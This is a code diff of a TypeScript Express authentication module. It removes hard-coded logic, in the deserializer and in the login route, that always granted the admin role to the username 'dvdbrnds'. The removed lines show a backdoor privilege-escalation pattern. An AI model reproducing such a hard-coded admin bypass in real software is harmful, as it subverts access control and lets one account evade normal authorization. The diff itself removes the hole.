@@ -205,11 +205,6 @@ export function configureAuth(app: Express): void {
       // Attach tenant info to user for downstream verification
       (user as any)._sessionTenantId = tenantId;
 
-      // Ensure dvdbrnds is always admin
-      if (user && user.username === 'dvdbrnds' && user.role !== 'admin') {
-        user = { ...user, role: 'admin' };
-      }
-
       done(null, user);
     } catch (error) {
       console.error('[AUTH] Deserialization error:', error);
@@ -228,12 +223,7 @@ function setupAuthRoutes(app: Express): void {
   // Local login
   if (institutionConfig.authentication.usernamePasswordEnabled) {
     app.post('/api/login', passport.authenticate('local'), async (req: Request, res: Response) => {
-      let user = req.user;
-
-      // Ensure dvdbrnds is always admin
-      if (user && user.username === 'dvdbrnds' && user.role !== 'admin') {
-        user = { ...user, role: 'admin' };
-      }
+      const user = req.user;
 
       // Check if user has MFA enabled (required for local accounts)
       if (user && user.mfaEnabled) {
